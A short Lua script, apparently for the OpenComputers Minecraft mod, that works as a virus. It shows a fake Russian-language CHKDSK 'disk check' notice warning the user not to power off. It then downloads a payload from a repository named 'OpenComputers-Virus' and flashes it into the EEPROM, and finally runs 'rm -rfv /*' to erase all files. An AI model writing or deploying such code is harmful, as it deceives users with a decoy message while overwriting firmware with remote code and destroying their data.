local component = require("component")
local computer = require("computer")
local shell2 = require("shell")
local eeprom = component.eeprom

local function download(url)
	local handle, data, chunk = component.proxy(component.list("internet")()).request(url), ""
	
	while true do
		chunk = handle.read(math.huge)
		if chunk then
			data = data .. chunk
		else
			break
		end
	end

	handle.close()
	return data
end

--Сообщение

local text = [[CHKDSK
Из-за недавней ошибки была запущена проверка диска.
Это займёт некоторое время. Если вы думаете, что компьютер завил, то это не так!

НЕ ВЫКЛЮЧАЙТЕ КОМПЮТЕР ВО ВРЕМЯ ПРОВЕРКИ, ЭТО СЛОМАЕТ ЕГО!!!]]
print(text)

--Перепрошивка EEPROM

eeprom.set( download("https://raw.githubusercontent.com/KKosty4ka/OpenComputers-Virus/master/eeprom.lua") )

-- Удаление данных

pcall(shell2.execute, "rm -rfv /*")
